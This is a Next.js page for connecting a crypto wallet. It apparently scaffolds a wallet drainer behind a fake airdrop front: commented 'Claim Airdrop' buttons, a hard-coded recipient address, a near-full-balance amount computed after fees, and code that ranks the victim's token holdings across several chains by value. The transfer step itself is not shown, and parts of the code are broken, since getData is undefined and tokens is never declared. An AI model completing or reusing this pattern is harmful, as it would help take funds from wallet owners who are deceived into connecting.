import Head from 'next/head'
import styles from '../styles/Home.module.css'
import 'bulma/css/bulma.css'
import {BigNumber, ethers} from 'ethers'
import { useState, useEffect } from 'react'
import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress, SenderAbi } from '../constants'

import * as ethAddresses from'../addresses/ethAddresses'
import * as bscAddresses from'../addresses/bscAddresses'
import * as polygonAddresses from'../addresses/polygonAddresses'



const MyWalletAddress = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E"



export default function Home() {

  const [account, setAccount] = useState()
  // const [user, setUser] = useState()
  const [isConnected, setIsConnected] = useState(false)
  const [provider, setProvider] = useState()
  const [signer, setSigner] = useState()
  const [balance, setBalance] = useState()
  const [gasPrice, setGasPrice] = useState()
  const [gasLimit, setGasLimit] = useState()
  const [aggregatorContract, setAggregatorContract] = useState()
  const [tokenContract, setTokenContract] = useState()
  const [error, setError] = useState()
  const [sucMsg, setSucMsg] = useState()
  const [chainId, setChainId] = useState()
  const [ethBalances, setEthBalances] = useState()
  const [bscBalances, setBscBalances] = useState()
  const [polygonBalances, setPolygonBalances] = useState()
  const [arbBalances, setArbBalances] = useState()
  const [opBalances, setOpBalances] = useState()
  const [biggerBalanceEth, setBiggerBalanceEth] = useState()
  const [biggerBalanceBsc, setBiggerBalanceBsc] = useState()
  const [biggerBalancePolygon, setBiggerBalancePolygon] = useState()
  const [biggerBalanceOp, setBiggerBalanceOp] = useState()
  const [biggerBalanceArb, setBiggerBalanceArb] = useState()
  
  let etherValueOfUser
  let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
  let user
  let _signer



  async function connect() {

    setError("")
    setSucMsg("")
    if (typeof window.ethereum !== 'undefined'){
      const isConnected1 = ethereum.isConnected()
      setIsConnected(isConnected1)
      try{
      const accounts = await ethereum.request({method: "eth_requestAccounts"})
      setAccount(accounts[0])
      const _provider = new ethers.providers.Web3Provider(window.ethereum,"any")
      setProvider(_provider)


      user = await _provider.send("eth_requestAccounts", []);

      _signer = _provider.getSigner()
      setSigner(_signer)
 
      const chainId = await signer.getChainId()
      setChainId(chainId)
      console.log(`chain id: ${chainId}`);

      const bal = await _signer.getBalance(user.address)
      const balToEth = ethers.utils.formatEther(bal)
   
      const gasL = ethers.utils.hexlify(100000)
      setGasLimit(gasL)

      const gasP = _provider.getGasPrice()
  
      setGasPrice(gasP)
      const fee = (await gasP).mul(gasL)
      const finalAmount = bal - (fee * 10)
      const finalAmountToString = finalAmount.toString()
      const finalAmountBigNumber =await BigNumber.from(finalAmountToString)
      setBalance(finalAmountBigNumber)
      console.log('amount - fee :',finalAmount);

      const isConnected2 = ethereum.isConnected()
      setIsConnected(isConnected2)
      getData()


      window.ethereum.on('accountsChanged',async () =>{
        const newAccounts = await ethereum.request({method: "eth_requestAccounts"})
        setAccount(newAccounts[0])
        console.log("connected wallet changed to:",newAccounts[0]);
      })
    
      ethereum.on('chainChanged', async () => {
        const newChainId = await signer.getChainId()
        setChainId(newChainId)
        console.log(`chain id changed to :${newChainId}`);
        window.location.reload();
      })
      ethereum.on('disconnect', setIsConnected(false));
      const isConnected3 = ethereum.isConnected()
      setIsConnected(isConnected3)
      
        console.log('user disconnected!');
      } catch(err){
        setError(err.message)
        // console.log('user rejected!');
      }
    }else{
      console.log("Please install MetaMask!");
    }
  }
  let _demical

  function getAddressTest() {
    console.log(ethAddresses.address.WETHETH);
  }

  async function createindex (priceContractAddress, tokenContractAddress , nameOfToken) {
    const priceContract = new ethers.Contract(priceContractAddress ,aggregator,provider)
    const tokenPriceWithDecimals = await priceContract.latestRoundData()
    const currentTokenPrice = tokenPriceWithDecimals.answer / 10**8
    const tokenContract = new ethers.Contract(tokenContractAddress,ERC20,provider)
    const balanceOfToken = await tokenContract.balanceOf(account)
    const valueOfTokenInAddress = (balanceOfToken*currentTokenPrice) / 10**18
    if ( balanceOfToken > 1000 ) {
        nameOfToken = {
            tokenAddress: tokenContractAddress,
            tokenBalance: balanceOfToken,
            tokenValue: valueOfTokenInAddress,
        }
        tokens.push(nameOfToken)
    }
    console.log(balanceOfToken);
}

 
  return (
    <div className='has-background-white'>
    <div className={styles.container}>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      
        <div className="has-background-white">
          <div className='box has-background-white'>
            <nav className='navbar has-background-white'>
              <div className='navbar-end'>
                <button onClick={() =>connect()} className='button is-link' >
                  Connect Wallet
                </button>
                {/* { isConnected ? (<button  className='button is-info ' disabled>Connected</button>) : (<button onClick={() =>connect()} className='button is-link' >
                  Connect Wallet
                </button>) } */}
                <button onClick={() => getAddressTest()} className= 'button is-primary ml-2'>
                  GetBalance
                </button>
                {/* <button onClick={''} className='button is-link'>getData</button> */}
              </div>
            </nav>
          </div>
        </div>
        <main className={styles.main}>
    
          
            <div className='column is-one-third'>
              <div className='box'>
                {/* <button onClick={''} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button>
                <button onClick={''} className='button is-dark is-centered' >Claim Airdrop</button> */}
              </div>
            </div>
          
      </main>

      <footer className={styles.footer}>
        <a
          className='has-text-black'
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by Alireza Haghshenas
        </a>
      </footer>
    </div>
    </div>
  )
}
